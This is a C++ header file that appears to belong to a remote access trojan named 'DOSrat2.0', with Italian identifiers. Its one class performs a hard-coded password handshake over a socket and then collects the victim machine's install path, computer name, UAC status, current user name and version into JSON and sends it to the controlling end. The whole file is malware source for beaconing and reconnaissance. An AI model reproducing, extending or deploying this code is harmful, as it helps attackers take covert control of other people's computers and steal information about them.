#pragma once

class COMUNICAZIONI
{
	private:
		static void TerminaConnessione(SOCKET Sock)
		{
			TcpIP::SetTimeout(0, Sock);
			closesocket(Sock);
		}

	public:
		static bool Inizializzazione(SOCKET Sock)
		{
			DirUtils du;
			GeneralUtils gu;

			char Pass[10] = "DOSrat2.0";
			string Buff;

			TcpIP::SetTimeout(10000, Sock);

			if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Sock);
				return false;
			}
			if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
			{
				TerminaConnessione(Sock);
				return false;
			}
			if ((string)Pass != "DOSrat2.0")
			{
				TerminaConnessione(Sock);
				return false;
			}

			TcpIP::SetTimeout(0, Sock);
			cout << "json" << endl;
			json data;

			data["InstallPath"] = du.GetFullFilePath();
			data["OS"] = "Win10";
			data["PCname"] = gu.GetPCName();
			data["UAC"] = gu.CheckUAC();
			data["UserName"] = gu.GetCurrentUser();
			data["Versione"] = Version;

			Buff = data.dump();

			send(Sock, to_string(Buff.size()).c_str(), 5, 0);
			send(Sock, Buff.c_str(), Buff.size(), 0);
			cout << Buff << endl;
			return true;
		}
};